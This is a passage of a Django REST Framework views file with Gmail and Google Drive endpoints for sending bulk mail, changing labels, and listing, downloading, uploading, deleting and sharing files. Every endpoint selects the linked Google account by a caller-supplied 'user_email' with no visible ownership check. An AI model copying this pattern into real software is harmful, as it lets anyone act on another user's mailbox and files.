            return Response(
                {'error': 'Gmail account not found'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Deactivate account
        gmail_account.is_active = False
        gmail_account.save()
        
        return Response({
            'success': True,
            'message': 'Gmail account disconnected successfully',
        }, status=status.HTTP_200_OK)
    
    except Exception as e:
        return Response(
            {'error': f'Failed to disconnect: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
def gmail_bulk_send(request):
    """
    Send bulk emails to multiple recipients
    
    Request body:
    {
        "user_email": "user@example.com",
        "recipients": ["email1@example.com", "email2@example.com"],
        "subject": "Bulk Email",
        "body": "Email body",
        "body_html": "<p>HTML body</p>",
        "cc": ["cc@example.com"],
        "bcc": ["bcc@example.com"]
    }
    """
    user_email = request.data.get('user_email')
    recipients = request.data.get('recipients', [])
    subject = request.data.get('subject')
    body = request.data.get('body')
    body_html = request.data.get('body_html')
    cc = request.data.get('cc', [])
    bcc = request.data.get('bcc', [])
    
    if not user_email:
        return Response(
            {'error': 'user_email is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    if not recipients or not isinstance(recipients, list):
        return Response(
            {'error': 'recipients must be a non-empty list'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    if not subject or not body:
        return Response(
            {'error': 'subject and body are required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not found or inactive'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        results = {
            'total': len(recipients),
            'success': [],
            'failed': []
        }
        
        for recipient in recipients:
            try:
                result = send_gmail_message(
                    gmail_account,
                    to=recipient,
                    subject=subject,
                    body=body,
                    body_html=body_html,
                    cc=cc,
                    bcc=bcc
                )
                results['success'].append({
                    'recipient': recipient,
                    'message_id': result.get('id'),
                    'thread_id': result.get('threadId')
                })
            except GmailServiceError as e:
                results['failed'].append({
                    'recipient': recipient,
                    'error': str(e)
                })
        
        results['success_count'] = len(results['success'])
        results['failed_count'] = len(results['failed'])
        
        return Response(results, status=status.HTTP_200_OK)
    
    except Exception as e:
        return Response(
            {'error': f'Failed to send bulk emails: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
def gmail_statistics(request):
    """
    Get Gmail account statistics
    
    Query params:
    - user_email: Required
    - days: Number of days to analyze (default: 30)
    """
    user_email = request.query_params.get('user_email')
    days = int(request.query_params.get('days', 30))
    
    if not user_email:
        return Response(
            {'error': 'user_email is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not found or inactive'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Calculate date range
        from_date = timezone.now() - timedelta(days=days)
        date_query = f'after:{from_date.strftime("%Y/%m/%d")}'
        
        # Fetch messages for statistics
        try:
            messages_data = fetch_gmail_messages(
                gmail_account,
                max_results=500,  # Gmail API limit
                query=date_query
            )
            
            messages = messages_data.get('messages', [])
            
            # Get detailed stats
            stats = {
                'total_messages': len(messages),
                'period_days': days,
                'from_date': from_date.isoformat(),
                'to_date': timezone.now().isoformat(),
                'gmail_email': gmail_account.gmail_email,
                'last_sync_at': gmail_account.last_sync_at.isoformat() if gmail_account.last_sync_at else None,
            }
            
            # Note: For detailed stats (sent/received, by label, etc.), 
            # you would need to fetch message details which is expensive.
            # This is a basic implementation.
            
            return Response(stats, status=status.HTTP_200_OK)
        
        except GmailServiceError as e:
            return Response(
                {'error': f'Failed to fetch statistics: {str(e)}'},
                status=status.HTTP_500_INTERNAL_SERVER_ERROR
            )
    
    except Exception as e:
        return Response(
            {'error': f'Failed to get statistics: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
def gmail_bulk_modify_labels(request):
    """
    Modify labels for multiple messages at once
    
    Request body:
    {
        "user_email": "user@example.com",
        "message_ids": ["msg1", "msg2", "msg3"],
        "add_label_ids": ["STARRED"],
        "remove_label_ids": ["UNREAD"]
    }
    """
    user_email = request.data.get('user_email')
    message_ids = request.data.get('message_ids', [])
    add_label_ids = request.data.get('add_label_ids', [])
    remove_label_ids = request.data.get('remove_label_ids', [])
    
    if not user_email:
        return Response(
            {'error': 'user_email is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    if not message_ids or not isinstance(message_ids, list):
        return Response(
            {'error': 'message_ids must be a non-empty list'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    if not add_label_ids and not remove_label_ids:
        return Response(
            {'error': 'At least one of add_label_ids or remove_label_ids must be provided'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not found or inactive'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        results = {
            'total': len(message_ids),
            'success': [],
            'failed': []
        }
        
        for message_id in message_ids:
            try:
                result = modify_message_labels(
                    gmail_account,
                    message_id,
                    add_label_ids=add_label_ids if add_label_ids else None,
                    remove_label_ids=remove_label_ids if remove_label_ids else None
                )
                results['success'].append({
                    'message_id': message_id,
                    'labels': result.get('labelIds', [])
                })
            except GmailServiceError as e:
                results['failed'].append({
                    'message_id': message_id,
                    'error': str(e)
                })
        
        results['success_count'] = len(results['success'])
        results['failed_count'] = len(results['failed'])
        
        return Response(results, status=status.HTTP_200_OK)
    
    except Exception as e:
        return Response(
            {'error': f'Failed to modify labels: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )

# ============================================================================
# Google Drive API Endpoints
# ============================================================================

@api_view(['GET'])
def drive_list_files(request):
    """List files in Google Drive"""
    user_email = request.query_params.get('user_email')
    if not user_email:
        return Response({'error': 'user_email parameter is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        page_size = int(request.query_params.get('page_size', 25))
        result = list_drive_files(gmail_account, page_size=page_size, page_token=request.query_params.get('page_token'),
                                 query=request.query_params.get('query'), order_by=request.query_params.get('order_by'))
        return Response(result, status=status.HTTP_200_OK)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to list files: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
def drive_file_detail(request, file_id):
    """Get file metadata"""
    user_email = request.query_params.get('user_email')
    if not user_email:
        return Response({'error': 'user_email parameter is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        return Response(get_file_metadata(gmail_account, file_id), status=status.HTTP_200_OK)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to get file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
def drive_download_file(request, file_id):
    """Download file content"""
    user_email = request.query_params.get('user_email')
    if not user_email:
        return Response({'error': 'user_email parameter is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        file_content = download_file(gmail_account, file_id)
        file_metadata = get_file_metadata(gmail_account, file_id)
        from django.http import HttpResponse
        response = HttpResponse(file_content, content_type=file_metadata.get('mimeType', 'application/octet-stream'))
        response['Content-Disposition'] = f'attachment; filename="{file_metadata.get("name", "file")}"'
        return response
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to download file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['POST'])
def drive_upload_file(request):
    """Upload file to Google Drive"""
    user_email = request.data.get('user_email')
    if not user_email or 'file' not in request.FILES:
        return Response({'error': 'user_email and file are required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        uploaded_file = request.FILES['file']
        result = upload_file(gmail_account, file_name=uploaded_file.name, file_content=uploaded_file.read(),
                           parent_folder_id=request.data.get('parent_folder_id'), description=request.data.get('description'))
        return Response(result, status=status.HTTP_201_CREATED)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to upload file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['POST'])
def drive_create_folder(request):
    """Create folder in Google Drive"""
    user_email = request.data.get('user_email')
    folder_name = request.data.get('folder_name')
    if not user_email or not folder_name:
        return Response({'error': 'user_email and folder_name are required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        result = create_folder(gmail_account, folder_name=folder_name, parent_folder_id=request.data.get('parent_folder_id'),
                              description=request.data.get('description'))
        return Response(result, status=status.HTTP_201_CREATED)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to create folder: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['DELETE'])
def drive_delete_file(request, file_id):
    """Delete file from Google Drive"""
    user_email = request.query_params.get('user_email')
    if not user_email:
        return Response({'error': 'user_email parameter is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        success = delete_file(gmail_account, file_id)
        return Response({'success': success}, status=status.HTTP_200_OK if success else status.HTTP_500_INTERNAL_SERVER_ERROR)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to delete file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['POST'])
def drive_share_file(request, file_id):
    """Share file with another user"""
    user_email = request.data.get('user_email')
    email = request.data.get('email')
    if not user_email or not email:
        return Response({'error': 'user_email and email are required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        result = share_file(gmail_account, file_id=file_id, email=email, role=request.data.get('role', 'reader'),
                          send_notification=request.data.get('send_notification', True))
        return Response(result, status=status.HTTP_200_OK)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to share file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
def drive_storage_info(request):
    """Get Google Drive storage information"""
    user_email = request.query_params.get('user_email')
    if not user_email:
        return Response({'error': 'user_email parameter is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        return Response(get_drive_storage_info(gmail_account), status=status.HTTP_200_OK)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to get storage info: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
def drive_search_files(request):
    """Search files in Google Drive"""
    user_email = request.query_params.get('user_email')
    query = request.query_params.get('query')
    if not user_email or not query:
        return Response({'error': 'user_email and query are required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        result = search_files(gmail_account, query=query, page_size=int(request.query_params.get('page_size', 25)),
                            page_token=request.query_params.get('page_token'))
        return Response(result, status=status.HTTP_200_OK)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to search files: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['POST'])
def drive_copy_file(request, file_id):
    """Copy file in Google Drive"""
    user_email = request.data.get('user_email')
    if not user_email:
        return Response({'error': 'user_email is required'}, status=status.HTTP_400_BAD_REQUEST)
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email, is_active=True).first()
        if not gmail_account:
            return Response({'error': 'Google account not found or inactive'}, status=status.HTTP_404_NOT_FOUND)
        result = copy_file(gmail_account, file_id=file_id, new_name=request.data.get('new_name'),
                         parent_folder_id=request.data.get('parent_folder_id'))
        return Response(result, status=status.HTTP_201_CREATED)
    except DriveServiceError as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return Response({'error': f'Failed to copy file: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


# ip_download_file migrated to api.views.apk
